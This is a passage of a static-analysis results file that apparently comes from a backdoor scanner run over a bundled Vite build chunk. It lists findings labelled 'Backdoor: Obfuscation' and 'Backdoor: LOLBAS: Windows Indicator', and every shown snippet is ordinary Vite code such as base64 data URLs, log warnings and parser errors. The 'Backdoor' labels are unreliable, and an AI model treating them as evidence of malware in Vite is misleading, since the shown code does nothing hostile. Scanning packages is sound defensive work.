                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20409,
                  "startColumn": 57,
                  "endLine": 20409,
                  "endColumn": 63,
                  "snippet": {
                    "text": "      url = svgToDataURL(content);\n    } else {\n      const mimeType = lookup(file) ?? \"application/octet-stream\";\n      url = `data:${mimeType};base64,${content.toString(\"base64\")}`;\n    }\n  } else {\n    const { search, hash } = parse$h(id);\n",
                    "rendered": {
                      "text": "      url = svgToDataURL(content);\n    } else {\n      const mimeType = lookup(file) ?? \"application/octet-stream\";\n      url = `data:${mimeType};base64,${content.toString(\"base64\")}`;\n    }\n  } else {\n    const { search, hash } = parse$h(id);\n",
                      "markdown": "`      url = svgToDataURL(content);\n    } else {\n      const mimeType = lookup(file) ?? \"application/octet-stream\";\n      url = `data:${mimeType};base64,${content.toString(\"base64\")}`;\n    }\n  } else {\n    const { search, hash } = parse$h(id);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20409,
                  "startColumn": 30,
                  "endLine": 20409,
                  "endColumn": 36,
                  "snippet": {
                    "text": "      url = svgToDataURL(content);\n    } else {\n      const mimeType = lookup(file) ?? \"application/octet-stream\";\n      url = `data:${mimeType};base64,${content.toString(\"base64\")}`;\n    }\n  } else {\n    const { search, hash } = parse$h(id);\n",
                    "rendered": {
                      "text": "      url = svgToDataURL(content);\n    } else {\n      const mimeType = lookup(file) ?? \"application/octet-stream\";\n      url = `data:${mimeType};base64,${content.toString(\"base64\")}`;\n    }\n  } else {\n    const { search, hash } = parse$h(id);\n",
                      "markdown": "`      url = svgToDataURL(content);\n    } else {\n      const mimeType = lookup(file) ?? \"application/octet-stream\";\n      url = `data:${mimeType};base64,${content.toString(\"base64\")}`;\n    }\n  } else {\n    const { search, hash } = parse$h(id);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17216,
                  "startColumn": 124,
                  "endLine": 17216,
                  "endColumn": 130,
                  "snippet": {
                    "text": "    }))\n  );\n}\nconst cleanSrcSetRE = /(?:url|image|gradient|cross-fade)\\([^)]*\\)|\"([^\"]|(?<=\\\\)\")*\"|'([^']|(?<=\\\\)')*'|data:\\w+\\/[\\w.+\\-]+;base64,[\\w+/=]+|\\?\\S+,/g;\nfunction splitSrcSet(srcs) {\n  const parts = [];\n  const cleanedSrcs = srcs.replace(cleanSrcSetRE, blankReplacer);\n",
                    "rendered": {
                      "text": "    }))\n  );\n}\nconst cleanSrcSetRE = /(?:url|image|gradient|cross-fade)\\([^)]*\\)|\"([^\"]|(?<=\\\\)\")*\"|'([^']|(?<=\\\\)')*'|data:\\w+\\/[\\w.+\\-]+;base64,[\\w+/=]+|\\?\\S+,/g;\nfunction splitSrcSet(srcs) {\n  const parts = [];\n  const cleanedSrcs = srcs.replace(cleanSrcSetRE, blankReplacer);\n",
                      "markdown": "`    }))\n  );\n}\nconst cleanSrcSetRE = /(?:url|image|gradient|cross-fade)\\([^)]*\\)|\"([^\"]|(?<=\\\\)\")*\"|'([^']|(?<=\\\\)')*'|data:\\w+\\/[\\w.+\\-]+;base64,[\\w+/=]+|\\?\\S+,/g;\nfunction splitSrcSet(srcs) {\n  const parts = [];\n  const cleanedSrcs = srcs.replace(cleanSrcSetRE, blankReplacer);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 11194,
                  "startColumn": 46,
                  "endLine": 11194,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\t}\n\n\ttoUrl() {\n\t\treturn 'data:application/json;charset=utf-8;base64,' + btoa$1(this.toString());\n\t}\n};\n\n",
                    "rendered": {
                      "text": "\t}\n\n\ttoUrl() {\n\t\treturn 'data:application/json;charset=utf-8;base64,' + btoa$1(this.toString());\n\t}\n};\n\n",
                      "markdown": "`\t}\n\n\ttoUrl() {\n\t\treturn 'data:application/json;charset=utf-8;base64,' + btoa$1(this.toString());\n\t}\n};\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 11166,
                  "startColumn": 54,
                  "endLine": 11166,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\tif (typeof globalThis !== 'undefined' && typeof globalThis.btoa === 'function') {\n\t\treturn (str) => globalThis.btoa(unescape(encodeURIComponent(str)));\n\t} else if (typeof Buffer === 'function') {\n\t\treturn (str) => Buffer.from(str, 'utf-8').toString('base64');\n\t} else {\n\t\treturn () => {\n\t\t\tthrow new Error('Unsupported environment: `window.btoa` or `Buffer` should be supported.');\n",
                    "rendered": {
                      "text": "\tif (typeof globalThis !== 'undefined' && typeof globalThis.btoa === 'function') {\n\t\treturn (str) => globalThis.btoa(unescape(encodeURIComponent(str)));\n\t} else if (typeof Buffer === 'function') {\n\t\treturn (str) => Buffer.from(str, 'utf-8').toString('base64');\n\t} else {\n\t\treturn () => {\n\t\t\tthrow new Error('Unsupported environment: `window.btoa` or `Buffer` should be supported.');\n",
                      "markdown": "`\tif (typeof globalThis !== 'undefined' && typeof globalThis.btoa === 'function') {\n\t\treturn (str) => globalThis.btoa(unescape(encodeURIComponent(str)));\n\t} else if (typeof Buffer === 'function') {\n\t\treturn (str) => Buffer.from(str, 'utf-8').toString('base64');\n\t} else {\n\t\treturn () => {\n\t\t\tthrow new Error('Unsupported environment: `window.btoa` or `Buffer` should be supported.');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66343,
                  "startColumn": 60,
                  "endLine": 66343,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    resolved.logger.warn(\n      colors$1.yellow(`\n(!) Experimental legacy.buildSsrCjsExternalHeuristics and ssr.format were be removed in Vite 5.\n    The only SSR Output format is ESM. Find more information at https://github.com/vitejs/vite/discussions/13816.\n`)\n    );\n  }\n",
                    "rendered": {
                      "text": "    resolved.logger.warn(\n      colors$1.yellow(`\n(!) Experimental legacy.buildSsrCjsExternalHeuristics and ssr.format were be removed in Vite 5.\n    The only SSR Output format is ESM. Find more information at https://github.com/vitejs/vite/discussions/13816.\n`)\n    );\n  }\n",
                      "markdown": "`    resolved.logger.warn(\n      colors$1.yellow(`\n(!) Experimental legacy.buildSsrCjsExternalHeuristics and ssr.format were be removed in Vite 5.\n    The only SSR Output format is ESM. Find more information at https://github.com/vitejs/vite/discussions/13816.\n`)\n    );\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66177,
                  "startColumn": 82,
                  "endLine": 66177,
                  "endColumn": 90,
                  "snippet": {
                    "text": "    createUserWorkerPlugins = () => config.worker?.plugins;\n    logger.warn(\n      colors$1.yellow(\n        `worker.plugins is now a function that returns an array of plugins. Please update your Vite config accordingly.\n`\n      )\n    );\n",
                    "rendered": {
                      "text": "    createUserWorkerPlugins = () => config.worker?.plugins;\n    logger.warn(\n      colors$1.yellow(\n        `worker.plugins is now a function that returns an array of plugins. Please update your Vite config accordingly.\n`\n      )\n    );\n",
                      "markdown": "`    createUserWorkerPlugins = () => config.worker?.plugins;\n    logger.warn(\n      colors$1.yellow(\n        `worker.plugins is now a function that returns an array of plugins. Please update your Vite config accordingly.\n`\n      )\n    );\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66093,
                  "startColumn": 153,
                  "endLine": 66093,
                  "endColumn": 161,
                  "snippet": {
                    "text": "  ) {\n    logger.warn(\n      colors$1.yellow(\n        `\\`resolve.browserField\\` is set to false, but the option is removed in favour of the 'browser' string in \\`resolve.mainFields\\`. You may want to update \\`resolve.mainFields\\` to remove the 'browser' string and preserve the previous browser behaviour.`\n      )\n    );\n  }\n",
                    "rendered": {
                      "text": "  ) {\n    logger.warn(\n      colors$1.yellow(\n        `\\`resolve.browserField\\` is set to false, but the option is removed in favour of the 'browser' string in \\`resolve.mainFields\\`. You may want to update \\`resolve.mainFields\\` to remove the 'browser' string and preserve the previous browser behaviour.`\n      )\n    );\n  }\n",
                      "markdown": "`  ) {\n    logger.warn(\n      colors$1.yellow(\n        `\\`resolve.browserField\\` is set to false, but the option is removed in favour of the 'browser' string in \\`resolve.mainFields\\`. You may want to update \\`resolve.mainFields\\` to remove the 'browser' string and preserve the previous browser behaviour.`\n      )\n    );\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 65479,
                  "startColumn": 68,
                  "endLine": 65479,
                  "endColumn": 72,
                  "snippet": {
                    "text": "        if (!id || !id.endsWith(\"?commonjs-external\")) {\n          throw new Error(\n            `[vite]: Rollup failed to resolve import \"${exporter}\" from \"${id}\".\nThis is most likely unintended because it can break your application at runtime.\nIf you do want to externalize this module explicitly add it to\n\\`build.rollupOptions.external\\``\n          );\n",
                    "rendered": {
                      "text": "        if (!id || !id.endsWith(\"?commonjs-external\")) {\n          throw new Error(\n            `[vite]: Rollup failed to resolve import \"${exporter}\" from \"${id}\".\nThis is most likely unintended because it can break your application at runtime.\nIf you do want to externalize this module explicitly add it to\n\\`build.rollupOptions.external\\``\n          );\n",
                      "markdown": "`        if (!id || !id.endsWith(\"?commonjs-external\")) {\n          throw new Error(\n            `[vite]: Rollup failed to resolve import \"${exporter}\" from \"${id}\".\nThis is most likely unintended because it can break your application at runtime.\nIf you do want to externalize this module explicitly add it to\n\\`build.rollupOptions.external\\``\n          );\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63419,
                  "startColumn": 23,
                  "endLine": 63419,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    return;\n  }\n  config.logger.info(\n    colors$1.green(`hmr update `) + colors$1.dim([...new Set(updates.map((u) => u.path))].join(\", \")),\n    { clear: !afterInvalidation, timestamp: true }\n  );\n  hot.send({\n",
                    "rendered": {
                      "text": "    return;\n  }\n  config.logger.info(\n    colors$1.green(`hmr update `) + colors$1.dim([...new Set(updates.map((u) => u.path))].join(\", \")),\n    { clear: !afterInvalidation, timestamp: true }\n  );\n  hot.send({\n",
                      "markdown": "`    return;\n  }\n  config.logger.info(\n    colors$1.green(`hmr update `) + colors$1.dim([...new Set(updates.map((u) => u.path))].join(\", \")),\n    { clear: !afterInvalidation, timestamp: true }\n  );\n  hot.send({\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63415,
                  "startColumn": 34,
                  "endLine": 63415,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    return;\n  }\n  if (updates.length === 0) {\n    debugHmr?.(colors$1.yellow(`no update happened `) + colors$1.dim(file));\n    return;\n  }\n  config.logger.info(\n",
                    "rendered": {
                      "text": "    return;\n  }\n  if (updates.length === 0) {\n    debugHmr?.(colors$1.yellow(`no update happened `) + colors$1.dim(file));\n    return;\n  }\n  config.logger.info(\n",
                      "markdown": "`    return;\n  }\n  if (updates.length === 0) {\n    debugHmr?.(colors$1.yellow(`no update happened `) + colors$1.dim(file));\n    return;\n  }\n  config.logger.info(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 61852,
                  "startColumn": 57,
                  "endLine": 61852,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        )}.`;\n      }\n    } else {\n      warning = `Files in the public directory are served at the root path.\nInstead of ${colors$1.cyan(url)}, use ${colors$1.cyan(\n        url.replace(publicPath, \"/\")\n      )}.`;\n",
                    "rendered": {
                      "text": "        )}.`;\n      }\n    } else {\n      warning = `Files in the public directory are served at the root path.\nInstead of ${colors$1.cyan(url)}, use ${colors$1.cyan(\n        url.replace(publicPath, \"/\")\n      )}.`;\n",
                      "markdown": "`        )}.`;\n      }\n    } else {\n      warning = `Files in the public directory are served at the root path.\nInstead of ${colors$1.cyan(url)}, use ${colors$1.cyan(\n        url.replace(publicPath, \"/\")\n      )}.`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 61838,
                  "startColumn": 60,
                  "endLine": 61838,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    if (isImportRequest(url)) {\n      const rawUrl = removeImportQuery(url);\n      if (urlRE.test(url)) {\n        warning = `Assets in the public directory are served at the root path.\nInstead of ${colors$1.cyan(rawUrl)}, use ${colors$1.cyan(\n          rawUrl.replace(publicPath, \"/\")\n        )}.`;\n",
                    "rendered": {
                      "text": "    if (isImportRequest(url)) {\n      const rawUrl = removeImportQuery(url);\n      if (urlRE.test(url)) {\n        warning = `Assets in the public directory are served at the root path.\nInstead of ${colors$1.cyan(rawUrl)}, use ${colors$1.cyan(\n          rawUrl.replace(publicPath, \"/\")\n        )}.`;\n",
                      "markdown": "`    if (isImportRequest(url)) {\n      const rawUrl = removeImportQuery(url);\n      if (urlRE.test(url)) {\n        warning = `Assets in the public directory are served at the root path.\nInstead of ${colors$1.cyan(rawUrl)}, use ${colors$1.cyan(\n          rawUrl.replace(publicPath, \"/\")\n        )}.`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 58516,
                  "startColumn": 49,
                  "endLine": 58516,
                  "endColumn": 53,
                  "snippet": {
                    "text": "      protocols.add(protocol);\n      start = end = -1;\n    } else {\n      throw new SyntaxError(`Unexpected character at index ${i}`);\n    }\n  }\n\n",
                    "rendered": {
                      "text": "      protocols.add(protocol);\n      start = end = -1;\n    } else {\n      throw new SyntaxError(`Unexpected character at index ${i}`);\n    }\n  }\n\n",
                      "markdown": "`      protocols.add(protocol);\n      start = end = -1;\n    } else {\n      throw new SyntaxError(`Unexpected character at index ${i}`);\n    }\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 58502,
                  "startColumn": 51,
                  "endLine": 58502,
                  "endColumn": 55,
                  "snippet": {
                    "text": "      if (end === -1 && start !== -1) end = i;\n    } else if (code === 0x2c /* ',' */) {\n      if (start === -1) {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n\n      if (end === -1) end = i;\n",
                    "rendered": {
                      "text": "      if (end === -1 && start !== -1) end = i;\n    } else if (code === 0x2c /* ',' */) {\n      if (start === -1) {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n\n      if (end === -1) end = i;\n",
                      "markdown": "`      if (end === -1 && start !== -1) end = i;\n    } else if (code === 0x2c /* ',' */) {\n      if (start === -1) {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n\n      if (end === -1) end = i;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57029,
                  "startColumn": 51,
                  "endLine": 57029,
                  "endColumn": 55,
                  "snippet": {
                    "text": "        paramName = undefined;\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    }\n  }\n",
                    "rendered": {
                      "text": "        paramName = undefined;\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    }\n  }\n",
                      "markdown": "`        paramName = undefined;\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    }\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57010,
                  "startColumn": 53,
                  "endLine": 57010,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        if (end === -1) end = i;\n      } else if (code === 0x3b || code === 0x2c) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n",
                    "rendered": {
                      "text": "        if (end === -1) end = i;\n      } else if (code === 0x3b || code === 0x2c) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n",
                      "markdown": "`        if (end === -1) end = i;\n      } else if (code === 0x3b || code === 0x2c) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57000,
                  "startColumn": 53,
                  "endLine": 57000,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        } else if (code === 0x5c /* '\\' */) {\n          isEscaping = true;\n        } else {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n      } else if (code === 0x22 && header.charCodeAt(i - 1) === 0x3d) {\n        inQuotes = true;\n",
                    "rendered": {
                      "text": "        } else if (code === 0x5c /* '\\' */) {\n          isEscaping = true;\n        } else {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n      } else if (code === 0x22 && header.charCodeAt(i - 1) === 0x3d) {\n        inQuotes = true;\n",
                      "markdown": "`        } else if (code === 0x5c /* '\\' */) {\n          isEscaping = true;\n        } else {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n      } else if (code === 0x22 && header.charCodeAt(i - 1) === 0x3d) {\n        inQuotes = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 56986,
                  "startColumn": 53,
                  "endLine": 56986,
                  "endColumn": 57,
                  "snippet": {
                    "text": "      //\n      if (isEscaping) {\n        if (tokenChars$1[code] !== 1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n        if (start === -1) start = i;\n        else if (!mustUnescape) mustUnescape = true;\n",
                    "rendered": {
                      "text": "      //\n      if (isEscaping) {\n        if (tokenChars$1[code] !== 1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n        if (start === -1) start = i;\n        else if (!mustUnescape) mustUnescape = true;\n",
                      "markdown": "`      //\n      if (isEscaping) {\n        if (tokenChars$1[code] !== 1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n        if (start === -1) start = i;\n        else if (!mustUnescape) mustUnescape = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 56976,
                  "startColumn": 51,
                  "endLine": 56976,
                  "endColumn": 55,
                  "snippet": {
                    "text": "        paramName = header.slice(start, i);\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    } else {\n      //\n",
                    "rendered": {
                      "text": "        paramName = header.slice(start, i);\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    } else {\n      //\n",
                      "markdown": "`        paramName = header.slice(start, i);\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    } else {\n      //\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 56960,
                  "startColumn": 53,
                  "endLine": 56960,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        if (end === -1 && start !== -1) end = i;\n      } else if (code === 0x3b || code === 0x2c) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n",
                    "rendered": {
                      "text": "        if (end === -1 && start !== -1) end = i;\n      } else if (code === 0x3b || code === 0x2c) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n",
                      "markdown": "`        if (end === -1 && start !== -1) end = i;\n      } else if (code === 0x3b || code === 0x2c) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 56951,
                  "startColumn": 51,
                  "endLine": 56951,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    } else if (paramName === undefined) {\n      if (end === -1 && tokenChars$1[code] === 1) {\n",
                    "rendered": {
                      "text": "\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    } else if (paramName === undefined) {\n      if (end === -1 && tokenChars$1[code] === 1) {\n",
                      "markdown": "`\n        start = end = -1;\n      } else {\n        throw new SyntaxError(`Unexpected character at index ${i}`);\n      }\n    } else if (paramName === undefined) {\n      if (end === -1 && tokenChars$1[code] === 1) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 56937,
                  "startColumn": 53,
                  "endLine": 56937,
                  "endColumn": 57,
                  "snippet": {
